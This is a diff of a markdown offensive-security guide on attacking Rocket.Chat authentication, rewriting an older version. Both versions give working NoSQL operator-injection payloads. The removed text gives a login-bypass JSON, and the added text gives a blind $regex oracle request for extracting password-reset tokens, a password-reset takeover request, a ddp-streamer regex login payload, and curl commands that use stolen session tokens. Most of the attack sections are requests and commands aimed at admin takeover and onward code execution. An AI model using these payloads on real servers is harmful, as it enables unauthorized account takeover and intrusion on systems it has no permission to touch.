@@ -1,86 +1,97 @@
 ---
-title: "Authentication"
-description: "The Rocket.Chat NoSQL operator-injection login bypass: POST /api/v1/login and the Meteor login method accept an object where a string is expected, so a MongoDB operator such as {\"$regex\":\"admin\"} or {\"$gt\":\"\"} injected into user or password matches an account without the real password and returns an authToken and userId. Covers the password-reset token weakness. Worked curl sending the operator-object payload and interpretation, feeding the token to the API and admin chain."
+title: "Authentication: NoSQL injection and account takeover in Rocket.Chat"
+description: "Attacking Rocket.Chat authentication: why the REST /api/v1/login does not fall to a naive operator object, the blind NoSQL injection in the account and password-reset methods that extracts a stored reset token character by character to take over an admin, and the Enterprise ddp-streamer username-lookup injection that becomes a bypass only with the separate missing-await password flaw."
 keywords:
-  - rocket.chat login bypass
-  - nosql injection
+  - rocket.chat nosql injection
   - mongodb operator injection
-  - authtoken
-  - meteor login
+  - password reset token extraction
+  - ddp-streamer
+  - account takeover
 ---
 
 # Authentication
 
-Rocket.Chat's authentication runs on Meteor's accounts system over MongoDB, and the historic signature flaw is a NoSQL operator injection: the `login` entry point builds a Mongo query from the submitted `user` and `password` fields, and on affected builds it does not force those fields to be strings. Submit a JSON object containing a Mongo query operator instead of a string, and the query matches an account (or verifies a password hash) without you knowing the real value, returning a full session. The same primitive appears at the REST `POST /api/v1/login` and at the Meteor DDP `login` method.
+Rocket.Chat runs on Meteor's accounts system over MongoDB. The folklore bypass, posting `{"user":{"$gt":""},"password":{"$gt":""}}` to `/api/v1/login`, does not work: that REST endpoint coerces `user` and `password` to strings before building the query, so an operator object is rejected. The real weaknesses are elsewhere, in Meteor method calls and microservices that build a Mongo selector from attacker-controlled JSON without forcing scalar types. The highest-value one is a blind NoSQL injection that extracts a stored password-reset token, which turns into a full admin takeover without ever guessing a password.
 
-## The injection point
+## Preconditions
 
-A normal login posts strings:
-
-```json
-{"user":"admin","password":"hunter2"}
+```bash
+curl -s http://<target>:3000/api/info | python3 -c 'import sys,json;print(json.load(sys.stdin).get("version"))'
+# the injection surface and the exact vulnerable method are version-bound; pin the build first
 ```
 
-The attack replaces a string with an object whose key is a Mongo operator. Because the backend interpolates the field into a query document, `{"$regex":"adm"}` becomes a pattern match over usernames and `{"$gt":""}` matches any non-empty value, so the query resolves to a real account regardless of the password supplied:
+Confirm whether the account methods are reachable over REST method calls (`/api/v1/method.call/<name>`) or only over the DDP websocket (`/websocket`); older builds expose method calls unauthenticated, which is what makes the blind oracle usable pre-auth.
+
+## Blind NoSQL injection to steal a reset token
+
+Rocket.Chat stores a password-reset token on the user document at `services.password.reset.token` once a reset is requested. A vulnerable account method builds its Mongo selector from your JSON, so a `$regex` operator on that field turns the method into a boolean oracle: a request whose regex matches returns a different response (a success/`true`, a different body length, or a timing delta) from one that does not, letting you recover the token one character at a time.
+
+First trigger a reset so the token exists, then extract it. Drive the oracle through the method call (shape is version-specific; the operator and the targeted field are the constant part):
 
 ```http
-POST /api/v1/login HTTP/1.1
+POST /api/v1/method.call/getPasswordPolicy HTTP/1.1
 Host: target:3000
 Content-Type: application/json
 
-{"user":{"$regex":"admin","$options":"i"},"password":{"$gt":""}}
+{"message":"{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^a.*\"}}],\"id\":\"1\"}"}
 ```
 
 ```text
-{"status":"success","data":{"userId":"rocketcat...","authToken":"Zx9...","me":{"username":"admin","roles":["admin"]}}}
+# match  -> HTTP 200 with the policy object (regex matched a user whose reset token starts with 'a')
+# miss   -> error / empty result (no user matched)
 ```
 
-Interpret the response: `status":"success"` with a `data.authToken` and a `me.roles` array containing `admin` is a full admin session won without the password. A `401`/`unauthorized` means that build string-coerces the field and is not injectable through REST; try the DDP method next. Anchor the regex (`"^admin$"`) when you know the exact target username from [enumeration](enumeration.md), so you land on the intended account rather than the first alphabetical match.
-
-## Over the Meteor DDP method
-
-Where REST is patched or proxied, the same object reaches the login resolver through the websocket method call, which some builds validate differently:
-
-```json
-{"msg":"method","method":"login","params":[{"user":{"$regex":"admin"},"password":{"$gt":""}}],"id":"1"}
-```
-
-The `result` frame returns `{"id":"<userId>","token":"<authToken>"}`. Feed those into the REST `X-Auth-Token`/`X-User-Id` headers for everything else; the two surfaces share the session store.
-
-## Using the token
+Walk the alphabet at each position (`^a`, `^b`, ... then `^<known>a`, `^<known>b`, ...) to rebuild the full `services.password.reset.token`. Automate the oracle rather than doing it by hand:
 
 ```bash
-curl -sk -H "X-Auth-Token: Zx9..." -H "X-User-Id: rocketcat..." \
-  http://<target>:3000/api/v1/me | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["username"],d["roles"])'
-#   admin ['admin']     confirms the token is admin
+# conceptually: for each position, binary/linear search the charset on the match/miss signal
+# nosqli-style tooling drives the same $regex oracle against the method parameter
 ```
 
-## Password-reset token weakness
-
-Where the login object is coerced to a string and the bypass is dead, the account-recovery flow is the fallback. `POST /api/v1/users.forgotPassword` issues a reset token mailed to the user; on builds where that token is generated from weak or time-seeded material rather than a CSPRNG, the token is guessable within a predictable window, and `/api/v1/users.resetPassword` (or the web reset form consuming the same token) then sets a new password without inbox access:
+With the token recovered, reset the target account's password directly:
 
 ```http
 POST /api/v1/users.resetPassword HTTP/1.1
 Host: target:3000
 Content-Type: application/json
 
-{"token":"<reset-token>","newPassword":"Owned-Passw0rd!"}
+{"token":"<recovered-reset-token>","newPassword":"Owned-Passw0rd!"}
 ```
 
-A `200`/`success` means the password is changed; log in normally to take the account.
+A `{"success":true}` means the password is set; log in normally as that user. Aim the extraction at a known admin email (from [enumeration](enumeration.md)) so the account you take over is `admin`.
+
+## The Enterprise ddp-streamer path
+
+On Enterprise builds that split the real-time layer into microservices, the `ddp-streamer` account service performs a username lookup that does accept an operator object, so `{"$regex":"admin"}` resolves to a real account. On its own that only selects a user; it becomes an authentication bypass when paired with a separate flaw where the password check is not awaited, so the login resolves before verification completes. Reach the streamer over its websocket method interface rather than the monolith REST login:
+
+```json
+{"msg":"method","method":"login","params":[{"user":{"$regex":"admin","$options":"i"},"password":"anything"}],"id":"1"}
+```
+
+The `result` frame returns `{"id":"<userId>","token":"<authToken>"}` when both conditions line up on the affected build. This path is narrow and version-bound; where it does not resolve, fall back to the reset-token extraction above, which is the more broadly applicable route.
+
+## Using the token
+
+Both routes end in a session pair. Rocket.Chat authenticates REST calls with two headers together:
+
+```bash
+curl -sk -H "X-Auth-Token: <authToken>" -H "X-User-Id: <userId>" \
+  http://<target>:3000/api/v1/me | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["username"],d.get("roles"))'
+#   admin ['admin']   confirms the session is the admin account
+```
 
 ## Follow-on
 
-An admin `authToken`/`userId` pair is the whole game: it unlocks the admin-only integration-script feature that runs server-side JavaScript, which is the code-execution route in [server exploitation](server-exploitation.md). A non-admin token still reads the directory and channels in [enumeration](enumeration.md) and is a foothold to pivot from.
+An admin session is the whole game: it unlocks the admin-only integration-script feature that runs server-side JavaScript, the code-execution route in [server exploitation](server-exploitation.md). A non-admin session still reads the directory and channels in [enumeration](enumeration.md) and is a foothold to pivot from.
 
 ## Tools
 
-- [RocketChat/Rocket.Chat (server source, to read the login resolver per build)](https://github.com/RocketChat/Rocket.Chat)
-- `wscat`/`websocat` for the DDP `login` method variant.
-- [NoSQLMap / nosqli for automating operator-injection discovery](https://github.com/codingo/NoSQLMap)
+- [RocketChat/Rocket.Chat (server source, to read the vulnerable method per build)](https://github.com/RocketChat/Rocket.Chat)
+- `wscat`/`websocat` to drive the DDP `method`/`login` calls over the websocket.
+- [NoSQLMap](https://github.com/codingo/NoSQLMap) to automate the `$regex` extraction oracle.
 
 ## References
 
-- [Rocket.Chat API: login](https://developer.rocket.chat/apidocs/login)
-- [OWASP Testing Guide: testing for NoSQL injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
+- [SonarSource: NoSQL injection in Rocket.Chat](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/)
+- [Rocket.Chat REST API reference](https://developer.rocket.chat/apidocs)
 - [PortSwigger: NoSQL injection](https://portswigger.net/web-security/nosql-injection)
